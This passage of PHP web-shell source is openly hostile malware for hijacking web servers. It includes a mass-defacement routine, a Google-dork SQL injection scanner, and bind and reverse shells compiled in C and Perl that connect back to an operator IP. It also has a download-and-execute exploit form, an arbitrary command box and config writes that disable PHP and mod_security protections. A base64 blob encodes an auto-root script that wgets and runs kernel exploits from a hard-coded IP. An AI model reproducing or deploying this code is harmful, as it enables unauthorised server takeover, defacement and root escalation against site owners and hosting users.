                        while (($file = readdir($dh)) !== false) {
                            if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/index.php";
                                $newtempik="http://".$file."index.php";
                                echo $newtempik."\n";
                                if (!copy($defaceurl, $newfile)) {
                                    echo "Error > ";
                                }
                            }
                        }
                        closedir($dh);
                    }
                }
                echo "</textarea></center>";
                ?>
                <br>
                <form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
                    [+] Main Directory: <input class ='inputz' type='text' size='60' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
                    <br><br>
                    [+] Defacement Url: <input class ='inputz' type='text' size='60'  name='massdefaceurl'>
                    <br>
                    <br>
                    <input id="menu" type='submit' name='execmassdeface' value='Execute'></form></td>



                <br><br><br>
                <font size="5">
                    ** Main Directory = The Directory you want to mass deface (Must have read/write permission) **<br>
                    ** Defacement Url = URL of your deface page (e.g: http://site.com/deface.html ) **<br><br>
                    <b>Recoded By Sid Gifari </b>

                    <?php
                    }
                    elseif(isset($_GET['x']) && ($_GET['x'] == 'sqli-scanner')){

                    ?>
                    <form action="?y=<?php echo $pwd; ?>&amp;x=sqli-scanner" method="post">

                        <?php

                        echo '<br><br><center><form method="post" action=""><b><font color="green">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:#00ff00;background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#00ff00;background-color:#000000" name="scan" value="Scan"></form></center>';

                        ob_start();
                        set_time_limit(0);

                        if (isset($_POST['scan'])) {

                            $browser = $_SERVER['HTTP_USER_AGENT'];

                            $first = "startgoogle.startpagina.nl/index.php?q=";
                            $sec = "&start=";
                            $reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

                            for($id=0 ; $id<=30; $id++){
                                $page=$id*10;
                                $dork=urlencode($_POST['dork']);
                                $url = $first.$dork.$sec.$page;

                                $curl = curl_init($url);
                                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
                                $result = curl_exec($curl);
                                curl_close($curl);

                                preg_match_all($reg,$result,$matches);
                            }
                            foreach($matches[1] as $site){

                                $url = preg_replace("/=/", "='", $site);
                                $curl=curl_init();
                                curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
                                curl_setopt($curl,CURLOPT_URL,$url);
                                curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
                                curl_setopt($curl,CURLOPT_TIMEOUT,'5');
                                $GET=curl_exec($curl);
                                if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) {
                                    echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln 

Found..</font></b></center>';
                                    ob_flush();flush();
                                }else{
                                    echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
                                    ob_flush();flush();
                                }
                                ob_flush();flush();
                            }
                            ob_flush();flush();
                        }
                        ob_flush();flush();


                        }
                        elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){@eval(gzinflate(base64_decode($upload))); "</div>";}
                        elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){



// bind connect with c
                            if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
                                $port = trim($_POST['port']);
                                $passwrd = trim($_POST['bind_pass']);
                                tulis("bdc.c",$port_bind_bd_c);
                                exe("gcc -o bdc bdc.c");
                                exe("chmod 777 bdc");
                                @unlink("bdc.c");
                                exe("./bdc ".$port." ".$passwrd." &");
                                $scan = exe("ps aux");
                                if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
                                else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
                            }
// bind connect with perl
                            elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
                                $port = trim($_POST['port']);
                                $passwrd = trim($_POST['bind_pass']);
                                tulis("bdp",$port_bind_bd_pl);
                                exe("chmod 777 bdp");
                                $p2=which("perl");
                                exe($p2." bdp ".$port." &");
                                $scan = exe("ps aux");
                                if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
                                else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
                            }
// back connect with c
                            elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
                                $ip = trim($_POST['ip']);
                                $port = trim($_POST['backport']);
                                tulis("bcc.c",$back_connect_c);
                                exe("gcc -o bcc bcc.c");
                                exe("chmod 777 bcc");
                                @unlink("bcc.c");
                                exe("./bcc ".$ip." ".$port." &");
                                $msg = "Now script try connect to ".$ip." port ".$port." ...";
                            }
// back connect with perl
                            elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
                                $ip = trim($_POST['ip']);
                                $port = trim($_POST['backport']);
                                tulis("bcp",$back_connect);
                                exe("chmod +x bcp");
                                $p2=which("perl");
                                exe($p2." bcp ".$ip." ".$port." &");
                                $msg = "Now script try connect to ".$ip." port ".$port." ...";
                            }
                            elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
                            {
                                $pilihan = trim($_POST['pilihan']);
                                $wurl = trim($_POST['wurl']);
                                $namafile = download($pilihan,$wurl);
                                if(is_file($namafile)) {

                                    $msg = exe($wcmd);
                                }
                                else $msg = "error: file not found $namafile";
                            }

                            ?>
                            <table class="tabnet">
                                <tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
                                <tr>
                                    <td>
                                        <table>
                                            <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
                                                <tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr>
                                                <tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr>
                                                <tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
                                                            <input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form>
                                        </table>
                                    </td>
                                    <td>
                                        <table>
                                            <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
                                                <tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"></td></tr>
                                                <tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr>
                                                <tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
                                                            <input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form>
                                        </table>
                                    </td>
                                    <td>
                                        <table>
                                            <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
                                                <tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr>
                                                <tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td>
                                                </tr>
                                                <tr><td><select size="1" class="inputz" name="pilihan">
                                                            <option value="wwget">wget</option>
                                                            <option value="wlynx">lynx</option>
                                                            <option value="wfread">fread</option>
                                                            <option value="wfetch">fetch</option>
                                                            <option value="wlinks">links</option>
                                                            <option value="wget">GET</option>
                                                            <option value="wcurl">curl</option>
                                                        </select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form>
                                        </table>
                                    </td>
                                </tr>
                            </table>
                            <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
                        <?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){  ?>
                            <form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
                                <table class="cmdbox">
                                    <tr><td colspan="2">
<textarea class="output" readonly>
<?php
if(isset($_POST['submitcmd'])) {
    echo @exe($_POST['cmd']);
}
?>
</textarea>
                                    <tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr>
                                </table>
                            </form>
                            <?php



                        }
                        else {
                            if(isset($_GET['delete']) && ($_GET['delete'] != "")){
                                $file = $_GET['delete'];
                                @unlink($file);
                            }
                            elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
                                @rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));
                            }
                            elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
                                $path = $pwd.$_GET['mkdir'];
                                @mkdir($path);
                            }
                            $buff = showdir($pwd,$prompt);
                            echo $buff;
                        }
                        ?>
                        <br><center>
                            <br><br>
                            <table><tr><input class=inputzbut align=left type=submit name=ini value="Bypass Disable Functions and Safemode" />
                                    <?php
                                    if(isset($_POST['ini']))
                                    {

                                        $byphp = "safe_mode = Off
disable_functions = None
safe_mode_gid = OFF
open_basedir = OFF
allow_url_fopen = On";
                                        $byht = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule>";
                                        file_put_contents("php.ini",$byphp);
                                        file_put_contents(".htaccess",$byht);
                                        echo "<script>alert('Disable Functions and Safemode Created'); hideAll();</script>";
                                        die();

                                    }

                                    ?></tr><tr> <form >
                                        <select class="inputzbut" name='tamv' onchange="if (this.value) window.open(this.value);">
                                            <option selected="selected" value=""> Tools Creator </option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=wso ";?>">WSO 2.8.1</option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=1n73 ";?>">1n73ction v3</option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=sabunmassal ";?>">Sabun Massal</option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=wk ";?>">WHMCS Killer</option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=adminer ";?>">Adminer 4.2.3</option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=b374k ";?>">b374k Shell</option>

                                        </select>
                                        <noscript><input type="submit" value="Submit"></noscript>
                                    </form></tr><tr>
                                    <form >
                                        <select class="inputzbut" name='tamv' onchange="if (this.value) window.open(this.value);">
                                            <option selected="selected" value=""> Tools Spammer </option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=ppmailceker ";?>">Paypal Valid Email Checker</option>
                                            <option value="<?php echo "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create=promailerv2 ";?>">Pro Mailler v2</option>

                                        </select>
                                        <noscript><input type="submit" value="Submit"></noscript>
                                    </form>



                                </tr><tr>
                                    <form method="post" action="">&nbsp;<select class="inputzbut" align="left"  name="pilihan" id="pilih"><option value=""selected>Select Your Favorit Tools</option><option value="htasell">htaccess Shell [ .htaccess ]</option><option value="rrot" >Perl Auto Rooting [ r00t.pl ]</option><option value="inisial" >PHP Auto Rooting [ r00t.php ]</option><option value="slc" >Server Log Cleaner [ serverLC.sh ]</option><option value="port" >Python Open Port 13123 [ port.py ]</option><option value="ini">Bypass Disable Function in Apache</option><option value="inis">Bypass Disable Function in Litespeed</option></select>
                                        <input  type="submit" name="submites" class="inputzbut" value="Created"></td>
                                    </form>
                                    <?php
                                    $submit = $_POST ['submites'];
                                    if(isset($submit)) {
                                        $pilih = $_POST['pilihan'];
                                        if ( $pilih == 'ini') {
                                            $byphp = "safe_mode = Off \n disable_functions = None \n safe_mode_gid = OFF \n open_basedir = OFF \n allow_url_fopen = On";
                                            $byht = "<IfModule mod_security.c> \n SecFilterEngine Off \n SecFilterScanPOST Off \n  SecFilterCheckURLEncoding Off \n  SecFilterCheckUnicodeEncoding Off \n  </IfModule>";
                                            $iniphp = '<? \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["file"]); \n ini_restore("safe_mode"); \n ini_restore("open_basedir"); \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["ss"]; \n ?>';
                                            file_put_contents("php.ini",$byphp);
                                            file_put_contents(".htaccess",$byht);
                                            file_put_contents("ini.php",$iniphp);
                                            echo "<script>alert('Disable Functions in Apache Created'); hideAll();</script>";
                                            die();
                                        }
                                        elseif ( $pilih == 'inis') {
                                            $iniph = '<? \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["file"]); \n ini_restore("safe_mode"); \n ini_restore("open_basedir"); \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["ss"]; \n ?>';
                                            $byph = "safe_mode = Off \n disable_functions= ";
                                            $comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
                                            file_put_contents("php.ini",base64_decode($byph));
                                            file_put_contents("ini.php",base64_decode($iniph));
                                            file_put_contents(".htaccess",base64_decode($comp));
                                            echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
                                            die();
                                        }
                                        elseif ( $pilih == 'inisial') {
                                            $rroter ="IyEvdXNyL2Jpbi9waHAgDQo8P3BocCANCi8qIA0KIyBBdXRvIHJvb3QgMjAxMyBEZXZlbG9wcGVkIGJ5IE1hdXJpdGFuaWEgQXR0YWNrZXINCiMgd3d3Lm1hdXJpdGFuaWEtc2VjLmNvbQ0KIyBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWF1cml0YW5pZS5mb3JldmVyDQojIDwzIEFub25HaG9zdCA8MyANCiovIA0Kc2V0X3RpbWVfbGltaXQoMCk7IA0Kc3lzdGVtKCJjbGVhciIpOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS0tLS0tfFxuIjsgDQpwcmludCAifFBIUCBBdXRvIFJvb3QgYnkgTWF1cml0YW5pYSBBdHRhY2tlciAgICAgICAgICAgICAgIHxcbiI7IA0KcHJpbnQgInwtLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLS0tLS0tLS0tLS18XG4iOyANCnByaW50ICJ8Q29udGFjdDogZmIuY29tL21hdXJpdGFuaWUuZm9yZXZlciAgICAgICAgICAgICAgICAgfFxuIjsgDQpwcmludCAifFByaXY4IFZlcnNpb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxcbiI7IA0KcHJpbnQgInxSb290aW5nOiBMaW51eCBhbmQgRnJlZUJTRCAgICAgICAgICAgICAgICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8PDMgQW5vbkdob3N0IDwzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfFxuIjsgDQpwcmludCAifC0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tLS0tLS0tLS0tLXxcbiI7IA0Kc2xlZXAoNCk7IA0KcHJpbnQgIlxuS2VybmVsIHRvIHZlcmlmeTpcbiI7IA0KcHJpbnQgImxueCBvciBic2Q6ICI7IA0KJGtlcm5lbCA9IGZnZXRzKFNURElOKTsgDQoka2VybmVsID0gdHJpbSgka2VybmVsKTsgDQppZigka2VybmVsID09ICJsbngiKSANCnsgDQpwcmludCAifC0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tLS0tLS0tLS18XG4iOyANCnByaW50ICJ8UEhQIEF1dG8gUm9vdCBieSBNYXVyaXRhbmlhIEF0dGFja2VyICAgICAgICAgICAgIHxcbiI7IA0KcHJpbnQgInwtLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLS0tLS0tLS0tfFxuIjsgDQpwcmludCAifFNlbGVjdGVkIGtlcm5lbCA6IHxMaW51eCBhcnF8ICAgICAgICAgICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS0tLXxcbiI7IA0Kc2xlZXAoMik7IA0KcHJpbnQgIlxuWytdIFRlc3RpbmcgbG54IHhwbCdzIHBsZWFzZSB3YWl0LlxuIjsgDQpwcmludCAiW35dIE1lYW53aGlsZSBzbW9rZSBhIGNpZ2FyZXQgWEQgKDpcbiI7IA0Kc2xlZXAoMik7IA0Kc3lzdGVtKCJta2RpciBsbng7Y2QgbG54LyIpOyANCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuM2FsbCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zYWxsIik7IA0Kc3lzdGVtKCIuLzIuNi4zYWxsIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTciKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTciKTsgDQpzeXN0ZW0oIi4vMi42LjE3Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgiKTsgDQpzeXN0ZW0oIi4vMi42LjE4Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTgtNiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC02Iik7IA0Kc3lzdGVtKCIuLzIuNi4xOC02Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTgtMjAiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMjAiKTsgDQpzeXN0ZW0oIi4vMi42LjE4LTIwIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzIiKTsgDQpzeXN0ZW0oIi4vMi42LjMyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzJfaTY4NiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zMl9pNjg2Iik7IA0Kc3lzdGVtKCIuLzIuNi4zMl9pNjg2Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzJuaW5lIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjMybmluZSIpOyANCnN5c3RlbSgiLi8yLjYuMzJuaW5lIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzMiKTsgDQpzeXN0ZW0oIi4vMi42LjMzIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzQiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQiKTsgDQpzeXN0ZW0oIi4vMi42LjM0Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzQtMjAxMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zNC0yMDExIik7IA0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzciKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzciKTsgDQpzeXN0ZW0oIi4vMi42LjM3Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzdyYzIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzdyYzIiKTsgDQpzeXN0ZW0oIi4vMi42LjM3cmMyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzctcmMyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM3LXJjMiIpOyANCnN5c3RlbSgiLi8yLjYuMzctcmMyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzktMjAxMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zOS0yMDExIik7IA0Kc3lzdGVtKCIuLzIuNi4zOS0yMDExIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzktMjAxMS0yMDEyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM5LTIwMTEtMjAxMiIpOyANCnN5c3RlbSgiLi8yLjYuMzktMjAxMS0yMDEyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYueCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi54Iik7IA0Kc3lzdGVtKCIuLzIuNi54Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8xNSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE1Iik7IA0Kc3lzdGVtKCIuLzE1Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yMDEwLTEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDEwLTEiKTsgDQpzeXN0ZW0oIi4vMjAxMC0xIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9hYiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGFiIik7IA0Kc3lzdGVtKCIuL2FiIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgYyIpOyANCnN5c3RlbSgiLi9jIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9lbDVpMzg2Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZWw1aTM4NiIpOyANCnN5c3RlbSgiLi9lbDVpMzg2Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9lbDV4ODYiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBlbDV4ODYiKTsgDQpzeXN0ZW0oIi4vZWw1eDg2Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9lbGZsYmwiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBlbGZsYmwiKTsgDQpzeXN0ZW0oIi4vZWxmbGJsIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHAxIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMSIpOyANCnN5c3RlbSgiLi9leHAxIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHAyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHAzIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMyIpOyANCnN5c3RlbSgiLi9leHAzIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHBsb2l0Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdCIpOyANCnN5c3RlbSgiLi9leHBsb2l0Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHBsb2l0MiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9mcm9vdCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGZyb290Iik7IA0Kc3lzdGVtKCIuL2Zyb290Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9nbGliYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGdsaWJjIik7IA0Kc3lzdGVtKCIuL2dsaWJjIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBpc2tvcnBpdHgiKTsgDQpzeXN0ZW0oIi4vaXNrb3JwaXR4Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9qZXNzaWNhMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGplc3NpY2EyIik7IA0Kc3lzdGVtKCIuL2plc3NpY2EyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9wa2V4ZWMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBwa2V4ZWMiKTsgDQpzeXN0ZW0oIi4vcGtleGVjIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9yZHMtZXhwbG9pdCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJkcy1leHBsb2l0Iik7IA0Kc3lzdGVtKCIuL3Jkcy1leHBsb2l0Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC92bXNwbGljZSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHZtc3BsaWNlIik7IA0Kc3lzdGVtKCIuL3Ztc3BsaWNlIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC94cGxTVVBFUiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHhwbFNVUEVSIik7IA0Kc3lzdGVtKCIuL3hwbFNVUEVSIik7IA0Kc2xlZXAoMSk7IA0KcHJpbnQoIlsrXSBhbGwgbG54IHhwbCdzIHRlc3RlZHMhIGV4aXRpbmchXG4iKTsgDQpzeXN0ZW0oImlkIik7IA0KZXhpdCgwKTsgDQp9IA0KZWxzZWlmKCRrZXJuZWwgPT0gImJzZCIpIA0KeyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS18XG4iOyANCnByaW50ICJ8UEhQIEF1dG8gUm9vdCBieSBNYXVyaXRhbmlhIEF0dGFja2VyICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS18XG4iOyANCnByaW50ICJ8U2VsZWN0ZW